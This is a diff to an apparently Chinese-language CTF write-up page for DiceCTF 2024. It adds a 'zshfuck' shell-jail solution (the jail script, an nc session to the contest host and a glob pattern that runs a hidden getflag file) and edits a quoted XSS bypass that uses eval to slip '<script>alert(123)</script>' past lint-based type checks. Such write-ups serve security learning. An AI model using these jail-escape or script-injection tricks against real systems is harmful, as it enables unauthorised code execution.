@@ -619,6 +619,24 @@
 </nav>
 </li>
 <li class="md-nav__item">
+<a class="md-nav__link" href="#misc">
+<span class="md-ellipsis">
+      Misc
+    </span>
+</a>
+<nav aria-label="Misc" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#zshfuck">
+<span class="md-ellipsis">
+      zshfuck
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
 <a class="md-nav__link" href="#_1">
 <span class="md-ellipsis">
       引用
@@ -776,6 +794,24 @@
 <a class="md-nav__link" href="#dicequest">
 <span class="md-ellipsis">
       dicequest
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#misc">
+<span class="md-ellipsis">
+      Misc
+    </span>
+</a>
+<nav aria-label="Misc" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#zshfuck">
+<span class="md-ellipsis">
+      zshfuck
     </span>
 </a>
 </li>
@@ -1308,7 +1344,7 @@ H means hacking attempt, R means not a hacking attempt.
 <span class="p">)([</span><span class="mf">0</span><span class="p">])</span>
 </code></pre></div>
 <p>创建了一个函数，接收一个元素类型为 <code>number</code> 或 <code>string</code> 的数组作为参数，在函数内部判断首个元素是否是 <code>number</code> 类型，如果是的话就调用另一个函数。</p>
-<p><code class="highlight"><span class="p">(</span><span class="nx">y</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">y</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="o">=</span><span class="s1">'*'</span><span class="w"> </span><span class="p">})</span></code> 函数将参数 <code>y</code> 的首元素换成了 <code>'*'</code>，所以 <code class="highlight"><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="nx">y</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">y</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="o">=</span><span class="s1">'*'</span><span class="w"> </span><span class="p">})(</span><span class="nx">x</span><span class="p">),</span><span class="w"> </span><span class="nx">x</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="p">)</span></code> 相当于返回了 <code class="highlight"><span class="s1">'*'</span></code> 字符串。</p>
+<p><code class="highlight"><span class="p">(</span><span class="nx">y</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">y</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="o">=</span><span class="s1">'*'</span><span class="w"> </span><span class="p">})</span></code> 函数将参数 <code class="highlight"><span class="nx">y</span></code> 的首元素换成了 <code class="highlight"><span class="s1">'*'</span></code>，所以 <code class="highlight"><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="nx">y</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">y</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="o">=</span><span class="s1">'*'</span><span class="w"> </span><span class="p">})(</span><span class="nx">x</span><span class="p">),</span><span class="w"> </span><span class="nx">x</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="p">)</span></code> 相当于返回了 <code class="highlight"><span class="s1">'*'</span></code> 字符串。</p>
 <p>所以整体就是返回 <code class="highlight"><span class="s1">'*'</span></code> 字符串，应该是可以修改这个位置的内容来<span><span class="heti-spacing"> </span>XSS</span>。</p>
 <p>这些操作应该是可以迷惑类型检查的吧，但是这个<span class="heti-skip"><span class="heti-spacing"> </span>Payload<span class="heti-spacing"> </span></span>超出长度限制了。</p>
 <p>还有另一个<span><span class="heti-spacing"> </span>Payload</span>：</p>
@@ -1324,29 +1360,29 @@ H means hacking attempt, R means not a hacking attempt.
 <p><span>URL<span class="heti-spacing"> </span></span>需要缩短一下，推荐<a href="https://t.ly/"><span><span class="heti-spacing"> </span>t.ly</span></a></p>
 <p>（如果随机的短网址中包含了黑名单词，就再缩短一次吧……如果你和我一样倒霉的话）</p>
 <p>Flag: <code>dice{learning-how-eslint-works}</code></p>
-<p>在这之后，我又找到一个<span><span class="heti-spacing"> </span>writeup</span>：<a href="https://nanimokangaeteinai.hateblo.jp/entry/2024/02/06/051003#Web-272-another-csp-16-solves">nanimokangaeteinai.hateblo.jp/entry/2024/02/06/051003#Web-272-another-csp-16-solves</a></p>
+<p>在这之后，我又找到一个<span><span class="heti-spacing"> </span>writeup</span>：<a href="https://nanimokangaeteinai.hateblo.jp/entry/2024/02/06/051003">nanimokangaeteinai.hateblo.jp/entry/2024/02/06/051003</a></p>
 <p>它有利用 <code>eval</code> 的解决方法。</p>
 <div class="admonition quote">
 <p class="admonition-title">Quote</p>
-<p>なかなかアイデアが出てこなかった。急に、<code>eval</code> を使っているけれども、常に <code>number</code> が返ってくるように見えるようなコードを使うのはどうかと思いついた。ただ<span class="heti-skip"><span class="heti-spacing"> </span>eval<span class="heti-spacing"> </span></span>を呼び出すだけだと当然<span class="heti-skip"><span class="heti-spacing"> </span>"Unsafe return of an any typed value."<span class="heti-spacing"> </span></span>と怒られてしまうけれども、以下のように無理やり <code>eval</code> の返り値を数値に変換してやれば、トランスパイラは見逃してくれる。<code>eval</code> の実行時に何が起こっていようが気にはしない。</p>
+<p>なかなかアイデアが出てこなかった。急に、<code>eval</code> を使っているけれども、常に <code>number</code> が返ってくるように見えるようなコードを使うのはどうかと思いついた。ただ <code>eval</code> を呼び出すだけだと当然<span class="heti-skip"><span class="heti-spacing"> </span>"Unsafe return of an any typed value."<span class="heti-spacing"> </span></span>と怒られてしまうけれども、以下のように無理やり <code>eval</code> の返り値を数値に変換してやれば、トランスパイラは見逃してくれる。<code>eval</code> の実行時に何が起こっていようが気にはしない。</p>
 <div class="highlight"><pre><span></span><code><span class="o">+</span><span class="nb">eval</span><span class="p">(</span><span class="s1">'[].join("fuga")'</span><span class="p">)</span>
 </code></pre></div>
 <p>これを利用して、<code>eval</code> の中でやりたい放題やれるのではないかと考えた。次のコードは、実際には <code>Number</code> が <code>String</code> に置き換えられているので返り値は <code>NaNabc</code> になる。しかしながら、型推論では <code>eval</code> の中で何が起こるかは考慮されないので、<code>Number</code> が置き換えられないものとして、数値が返ってくるため問題ないとされる。</p>
 <div class="highlight"><pre><span></span><code><span class="p">(</span><span class="nx">x</span><span class="p">=&gt;</span><span class="o">+</span><span class="nb">eval</span><span class="p">(</span><span class="sb">`Number=String`</span><span class="p">)</span><span class="o">+</span><span class="nb">Number</span><span class="p">(</span><span class="nx">x</span><span class="p">))(</span><span class="s1">'abc'</span><span class="p">)</span>
 </code></pre></div>
-<p>これを利用して、以下のコードで<span class="heti-skip"><span class="heti-spacing"> </span>alert(123)<span class="heti-spacing"> </span></span>というコードを実行できた。</p>
+<p>これを利用して、以下のコードで <code>alert(123)</code> というコードを実行できた。</p>
 <div class="highlight"><pre><span></span><code><span class="p">(</span><span class="nx">x</span><span class="p">=&gt;</span><span class="o">+</span><span class="nb">eval</span><span class="p">(</span><span class="sb">`Number=String`</span><span class="p">)</span><span class="o">+</span><span class="nb">Number</span><span class="p">(</span><span class="nx">x</span><span class="p">))(</span><span class="s1">'&lt;script&gt;alert(123)&lt;/script&gt;'</span><span class="p">)</span>
 </code></pre></div>
 </div>
 <details class="quote">
 <summary>翻译自<span><span class="heti-spacing"> </span>GPT</span></summary>
-<p>我一直没有什么好主意。突然，我想到了使用<span><span class="heti-spacing"> </span>eval</span>，虽然它看起来总是返回数字。但如果只是简单地调用<span><span class="heti-spacing"> </span>eval</span>，显然会被警告说<span class="heti-skip"><span class="heti-spacing"> </span>"Unsafe return of an any typed value."<span class="heti-spacing"> </span></span>但如果我们强行将<span class="heti-skip"><span class="heti-spacing"> </span>eval<span class="heti-spacing"> </span></span>的返回值转换成数字，就可以让转译器忽略这个问题。<span>eval<span class="heti-spacing"> </span></span>在执行时无论发生什么都不在乎。</p>
+<p>我一直没有什么好主意。突然，我想到了使用 <code>eval</code>，虽然它看起来总是返回数字。但如果只是简单地调用 <code>eval</code>，显然会被警告说<span class="heti-skip"><span class="heti-spacing"> </span>"Unsafe return of an any typed value."<span class="heti-spacing"> </span></span>但如果我们强行将 <code>eval</code> 的返回值转换成数字，就可以让转译器忽略这个问题。<code>eval</code> 在执行时无论发生什么都不在乎。</p>
 <div class="highlight"><pre><span></span><code><span class="o">+</span><span class="nb">eval</span><span class="p">(</span><span class="s1">'[].join("fuga")'</span><span class="p">)</span>
 </code></pre></div>
-<p>利用这一点，我们可以在<span class="heti-skip"><span class="heti-spacing"> </span>eval<span class="heti-spacing"> </span></span>中为所欲为。下面的代码实际上是将 <code>Number</code> 替换成了 <code>String</code>，所以返回值会变成 <code>NaNabc</code>。但是，在类型推断中，不会考虑 <code>eval</code> 中会发生什么，所以假定 <code>Number</code> 不会被替换，认为返回值是数字，因此不会出现问题。</p>
+<p>利用这一点，我们可以在 <code>eval</code> 中为所欲为。下面的代码实际上是将 <code>Number</code> 替换成了 <code>String</code>，所以返回值会变成 <code>NaNabc</code>。但是，在类型推断中，不会考虑 <code>eval</code> 中会发生什么，所以假定 <code>Number</code> 不会被替换，认为返回值是数字，因此不会出现问题。</p>
 <div class="highlight"><pre><span></span><code><span class="p">(</span><span class="nx">x</span><span class="p">=&gt;</span><span class="o">+</span><span class="nb">eval</span><span class="p">(</span><span class="nb">Number</span><span class="o">=</span><span class="nb">String</span><span class="p">)</span><span class="o">+</span><span class="nb">Number</span><span class="p">(</span><span class="nx">x</span><span class="p">))(</span><span class="s1">'abc'</span><span class="p">)</span>
 </code></pre></div>
-<p>利用这一点，下面的代码可以执行<span><span class="heti-spacing"> </span>alert(123)</span>。</p>
+<p>利用这一点，下面的代码可以执行 <code>alert(123)</code>。</p>
 <div class="highlight"><pre><span></span><code><span class="p">(</span><span class="nx">x</span><span class="p">=&gt;</span><span class="o">+</span><span class="nb">eval</span><span class="p">(</span><span class="sb">`Number=String`</span><span class="p">)</span><span class="o">+</span><span class="nb">Number</span><span class="p">(</span><span class="nx">x</span><span class="p">))(</span><span class="s1">'&lt;script&gt;alert(123)&lt;/script&gt;'</span><span class="p">)</span>
 </code></pre></div>
 </details>
@@ -1403,17 +1439,107 @@ info: setting *0x55a3cdfecee0 to 0x1312d00...
 <p><a class="glightbox" data-desc-position="bottom" data-height="auto" data-type="image" data-width="auto" href="../../assets/images/writeups/2024/dicectf2024_quals/dicequest_flag.png"><img alt="dicequest_flag" src="../../assets/images/writeups/2024/dicectf2024_quals/dicequest_flag.png"/></a></p>
 <p>龙成群结队飞过去还挺酷，想知道代码怎么写的。</p>
 <p>Flag: <code>dice{your_flag_is_not_in_another_castle}</code></p>
+<h2 id="misc">Misc<a class="headerlink" href="#misc" title="Permanent link">¶</a></h2>
+<h3 id="zshfuck">zshfuck<a class="headerlink" href="#zshfuck" title="Permanent link">¶</a></h3>
+<p>参考<span><span class="heti-spacing"> </span>write-up</span>：</p>
+<ul>
+<li><a href="https://github.com/quasar098/ctf-writeups/blob/main/dicectf-2024/zshfuck/README.md">github.com/quasar098/ctf-writeups/blob/main/dicectf-2024/zshfuck/README.md</a></li>
+<li><a href="https://ctf.krauq.com/dicectf-2024#zshfuck-107-solves">ctf.krauq.com/dicectf-2024#zshfuck-107-solves</a></li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/zsh</span>
+print<span class="w"> </span>-n<span class="w"> </span>-P<span class="w"> </span><span class="s2">"%F{green}Specify your charset: %f"</span>
+<span class="nb">read</span><span class="w"> </span>-r<span class="w"> </span>charset
+<span class="c1"># get uniq characters in charset</span>
+<span class="nv">charset</span><span class="o">=(</span><span class="s2">"</span><span class="si">${</span><span class="p">(us..)charset</span><span class="si">}</span><span class="s2">"</span><span class="o">)</span>
+<span class="nv">banned</span><span class="o">=(</span><span class="s1">'*'</span><span class="w"> </span><span class="s1">'?'</span><span class="w"> </span><span class="s1">'`'</span><span class="o">)</span>
+
+<span class="k">if</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span><span class="si">${#</span><span class="nv">charset</span><span class="si">}</span><span class="w"> </span>-gt<span class="w"> </span><span class="m">6</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="si">${#</span><span class="nv">charset</span><span class="p">:|banned</span><span class="si">}</span><span class="w"> </span>-ne<span class="w"> </span><span class="si">${#</span><span class="nv">charset</span><span class="si">}</span><span class="w"> </span><span class="o">]]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">    </span>print<span class="w"> </span>-P<span class="w"> </span><span class="s2">"\n%F{red}That's too easy. Sorry.%f\n"</span>
+<span class="w">    </span><span class="nb">exit</span><span class="w"> </span><span class="m">1</span>
+<span class="k">fi</span>
+print<span class="w"> </span>-P<span class="w"> </span><span class="s2">"\n%F{green}OK! Got </span><span class="nv">$charset</span><span class="s2">.%f"</span>
+<span class="nv">charset</span><span class="o">+=(</span><span class="s1">$'\n'</span><span class="o">)</span>
+
+<span class="c1"># start jail via coproc</span>
+coproc<span class="w"> </span>zsh<span class="w"> </span>-s
+<span class="nb">exec</span><span class="w"> </span><span class="m">3</span>&gt;<span class="p">&amp;</span>p<span class="w"> </span><span class="m">4</span>&lt;<span class="p">&amp;</span>p
+
+<span class="c1"># read chars from fd 4 (jail stdout), print to stdout</span>
+<span class="k">while</span><span class="w"> </span><span class="nv">IFS</span><span class="o">=</span><span class="w"> </span><span class="nb">read</span><span class="w"> </span>-u4<span class="w"> </span>-r<span class="w"> </span>-k1<span class="w"> </span>char<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span>print<span class="w"> </span>-u1<span class="w"> </span>-n<span class="w"> </span>--<span class="w"> </span><span class="s2">"</span><span class="nv">$char</span><span class="s2">"</span>
+<span class="k">done</span><span class="w"> </span><span class="p">&amp;</span>
+<span class="c1"># read chars from stdin, send to jail stdin if valid</span>
+<span class="k">while</span><span class="w"> </span><span class="nv">IFS</span><span class="o">=</span><span class="w"> </span><span class="nb">read</span><span class="w"> </span>-u0<span class="w"> </span>-r<span class="w"> </span>-k1<span class="w"> </span>char<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span>!<span class="w"> </span><span class="si">${#</span><span class="nv">char</span><span class="p">:|charset</span><span class="si">}</span><span class="w"> </span>-eq<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">]]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">        </span>print<span class="w"> </span>-P<span class="w"> </span><span class="s2">"\n%F{red}Nope.%f\n"</span>
+<span class="w">        </span><span class="nb">exit</span><span class="w"> </span><span class="m">1</span>
+<span class="w">    </span><span class="k">fi</span>
+<span class="w">    </span><span class="c1"># send to fd 3 (jail stdin)</span>
+<span class="w">    </span>print<span class="w"> </span>-u3<span class="w"> </span>-n<span class="w"> </span>--<span class="w"> </span><span class="s2">"</span><span class="nv">$char</span><span class="s2">"</span>
+<span class="k">done</span>
+</code></pre></div>
+<p>我们可以指定六个字符作为字符集，不包括 <code>*</code>、<code>?</code>、<code>`</code>，然后我们可以用字符集内的字符向<span class="heti-skip"><span class="heti-spacing"> </span>zsh<span class="heti-spacing"> </span></span>发送命令并获得输出。</p>
+<p class="annotate">先需要找到 <code>getflag</code> 文件的位置，可以使用 <code>find /</code> 或者<code>grep -r g</code><span><span class="heti-spacing"> </span>(1)</span></p>
+<ol>
+<li><code>g</code> 可以替换为字符集中的 <code>r</code>、<code>e</code>、<code>p</code></li>
+</ol>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">"find /\nfind /"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>mc.ax<span class="w"> </span><span class="m">31774</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>flag
+/app/y0u/w1ll/n3v3r_g3t/th1s/getflag
+</code></pre></div>
+<p>接下来需要想办法匹配文件路径。</p>
+<div class="admonition quote">
+<p class="admonition-title">GPT</p>
+<p>在<span><span class="heti-spacing"> </span>Zsh</span>（Z Shell）中，匹配文件名是一个常见的操作，可以使用多种模式匹配和通配符来实现。以下是一些基本的方法和示例：</p>
+<ul>
+<li>
+<p>基本通配符<span><span class="heti-spacing"> </span>:</span></p>
+<ul>
+<li><code>*</code> 匹配任意数量的任意字符。例如，<code>*.txt</code> 匹配所有以 <code>.txt</code> 结尾的文件。</li>
+<li><code>?</code> 匹配任意单个字符。例如，<code>?.txt</code> 匹配所有单个字符后跟 <code>.txt</code> 的文件。</li>
+<li><code>[...]</code> 匹配任意一个括号内的字符。例如，<code>[ab]*</code> 匹配以 <code>a</code> 或 <code>b</code> 开头的任意文件。</li>
+</ul>
+</li>
+<li>
+<p>扩展通配符<span class="heti-skip"><span class="heti-spacing"> </span>(<span class="heti-spacing"> </span></span>需要使用<span class="heti-skip"><span class="heti-spacing"> </span>setopt EXTENDED_GLOB<span class="heti-spacing"> </span></span>启用<span><span class="heti-spacing"> </span>):</span></p>
+<ul>
+<li><code>^</code> 或 <code>!</code> 用于取反。例如，<code>*.txt(^*.bak)</code> 匹配所有 <code>.txt</code> 文件，除了以 <code>.bak</code> 结尾的文件。</li>
+<li><code>#</code> 用作量词，与正则表达式中的 <code>*</code>、<code>+</code> 类似。例如，<code>?(#1,2)</code> 匹配<span class="heti-skip"><span class="heti-spacing"> </span>1<span class="heti-spacing"> </span></span>到<span class="heti-skip"><span class="heti-spacing"> </span>2<span class="heti-spacing"> </span></span>个 <code>?</code> 代表的字符。</li>
+<li><code>~</code> 用于排除模式。例如，<code>*~*.bak</code> 匹配所有非 <code>.bak</code> 结尾的文件。</li>
+</ul>
+</li>
+<li>
+<p>递归匹配<span><span class="heti-spacing"> </span>:</span></p>
+<ul>
+<li><code>**</code> 用于递归匹配。例如，<code>**/*.txt</code> 匹配当前目录及所有子目录下的 <code>.txt</code> 文件。</li>
+</ul>
+</li>
+</ul>
+</div>
+<p>使用 <code>[^z]</code> 匹配任意一个不是 <code>z</code> 的字符，那么文件路径应该表示为：</p>
+<div class="highlight"><pre><span></span><code>/<span class="o">[</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">]</span>/<span class="o">[</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">]</span>/<span class="o">[</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">]</span>/<span class="o">[</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">]</span>/<span class="o">[</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">]</span>/<span class="o">[</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">]</span>
+</code></pre></div>
+<p>字符集只用到五位：<code>/</code>、<code>[</code>、<code>^</code>、<code>z</code>、<code>]</code></p>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>nc<span class="w"> </span>mc.ax<span class="w"> </span><span class="m">31774</span>
+Specify<span class="w"> </span>your<span class="w"> </span>charset:<span class="w"> </span>/<span class="o">[</span>^z<span class="o">]</span>
+
+OK!<span class="w"> </span>Got<span class="w"> </span>/<span class="w"> </span><span class="o">[</span><span class="w"> </span>^<span class="w"> </span>z<span class="w"> </span><span class="o">]</span>.
+/<span class="o">[</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">]</span>/<span class="o">[</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">]</span>/<span class="o">[</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">]</span>/<span class="o">[</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">]</span>/<span class="o">[</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">]</span>/<span class="o">[</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">][</span>^z<span class="o">]</span>
+dice<span class="o">{</span>d0nt_u_jU5T_l00oo0ve_c0d3_g0lf?<span class="o">}</span>
+</code></pre></div>
+<p>Flag: <code>dice{d0nt_u_jU5T_l00oo0ve_c0d3_g0lf?}</code></p>
 <h2 id="_1">引用<a class="headerlink" href="#_1" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h2>
 <ul>
 <li>ouuan's write-up: <a href="https://ouuan.moe/post/2024/02/dicectf-2024-quals">ouuan.moe/post/2024/02/dicectf-2024-quals</a></li>
 <li>st98's write-up: <a href="https://nanimokangaeteinai.hateblo.jp/entry/2024/02/06/051003">nanimokangaeteinai.hateblo.jp/entry/2024/02/06/051003</a></li>
+<li>krauq's write-up: <a href="https://ctf.krauq.com/dicectf-2024">ctf.krauq.com/dicectf-2024</a></li>
+<li>quasar098's write-up: <a href="https://github.com/quasar098/ctf-writeups/blob/main/dicectf-2024/zshfuck/README.md">github.com/quasar098/ctf-writeups/blob/main/dicectf-2024/zshfuck/README.md</a></li>
 </ul>
 <aside class="md-source-file">
 <span class="md-source-file__fact">
 <span class="md-icon" title="最后更新">
 <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1-2.1-2M12.5 7v5.2l4 2.4-1 1L11 13V7h1.5M11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2v1.8Z"></path></svg>
 </span>
-<span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2024年2月11日 08:23:39</span>
+<span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2024年2月12日 05:10:24</span>
 </span>
 <span class="md-source-file__fact">
 <span class="md-icon" title="创建日期">
